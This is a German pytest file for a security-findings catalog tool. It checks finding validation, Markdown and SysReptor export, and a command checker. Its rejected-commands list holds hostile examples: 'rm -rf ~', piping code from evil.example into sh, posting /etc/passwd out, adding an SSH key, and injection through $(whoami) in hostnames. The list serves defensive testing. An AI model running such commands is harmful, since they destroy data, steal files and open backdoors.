import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "werkzeuge"))
import katalog  # noqa: E402


def test_alle_befunde_gueltig():
    alle = katalog.lade_alle()
    assert alle, "keine Befunde gefunden"
    fehler = [f for pfad, b in alle for f in katalog.pruefe_befund(pfad, b)]
    assert fehler == []


def test_ids_eindeutig():
    ids = [b["id"] for _, b in katalog.lade_alle()]
    assert len(ids) == len(set(ids))


def test_validator_findet_fehler(tmp_path):
    p = tmp_path / "FALSCH.yaml"
    fehler = katalog.pruefe_befund(p, {"id": "klein", "schweregrad": "egal", "titel": {"de": "x"}})
    text = "\n".join(fehler)
    assert "ungültige id" in text and "schweregrad" in text and "titel.en" in text and "Dateiname" in text


def test_markdown_und_deutschland():
    md = katalog.als_markdown([b for _, b in katalog.lade_alle()], "muster-ag.ch", sz=True)
    assert "muster-ag.ch" in md and "{domain}" not in md
    assert "Maßnahme" in md and "«" not in md


def test_sysreptor_format():
    vorlagen = katalog.als_sysreptor([b for _, b in katalog.lade_alle()])
    v = vorlagen[0]
    assert set(v) == {"tags", "translations"}
    tr = v["translations"][0]
    assert tr["language"] == "de-DE" and tr["is_main"] is True and tr["status"] in ("in-progress", "finished")
    assert {"title", "summary", "description", "impact", "recommendation", "references"} <= set(tr["data"])
    assert all("{domain}" not in str(x["translations"][0]["data"]) for x in vorlagen)


def test_getrenntes_wort_wird_erkannt(tmp_path):
    b = {"beschreibung": "gefälschte DNS- Antworten"}
    assert any("getrenntes Wort" in f for f in katalog.pruefe_befund(tmp_path / "X.yaml", b))
    b = {"beschreibung": "Rechnungs- und CEO-Betrug"}
    assert not any("getrenntes Wort" in f for f in katalog.pruefe_befund(tmp_path / "X.yaml", b))


ERLAUBTE_BEFEHLE = [
    "dig TXT {domain} +short | grep spf1",
    "curl -sI https://{domain}/ | grep -iE '^(server|x-powered-by):'",
    "echo | openssl s_client -connect {domain}:443 -servername {domain} 2>/dev/null | openssl x509 -noout -enddate",
    "openssl s_client -connect {domain}:443 -tls1_1 </dev/null",
    "dig CNAME <subdomain>.{domain} +short && dig A <ziel> +short",
    "nmap -Pn -p 3389,5900,23 <ip>   # nur mit Einverständnis des Inhabers",
    "https://internetdb.shodan.io/<ip>",
]

BOESE_BEFEHLE = [
    "dig {domain}; rm -rf ~",
    "dig {domain} || rm -rf ~",
    "dig {domain} & curl -s https://x/",
    "curl -s https://evil.example/x | sh",
    "curl -s https://evil.example/x | bash",
    "curl -s https://evil.example/x -o ~/.bashrc",
    "curl -s -d @/etc/passwd https://evil.example/",
    "curl -s -K /tmp/cfg https://{domain}/",
    "dig `id`.{domain}",
    "dig $(whoami).{domain}",
    "echo 'ssh-ed25519 AAAA' >> ~/.ssh/authorized_keys",
    "dig {domain} > ~/.profile",
    "python3 -c 'import os'",
    "openssl x509 -in a -out /etc/x",
    "openssl enc -d -in x",
    "nmap --script vuln <ip>   # nur mit Einverständnis des Inhabers",
    "nmap -Pn -p 1-65535 <ip>",
    "https://evil.example/$(id)",
]


@pytest.mark.parametrize("befehl", ERLAUBTE_BEFEHLE)
def test_pruefbefehl_erlaubt(befehl):
    assert katalog.pruefe_befehl(befehl) is None


@pytest.mark.parametrize("befehl", BOESE_BEFEHLE)
def test_pruefbefehl_gefaehrlich(befehl):
    assert katalog.pruefe_befehl(befehl), f"nicht erkannt: {befehl}"
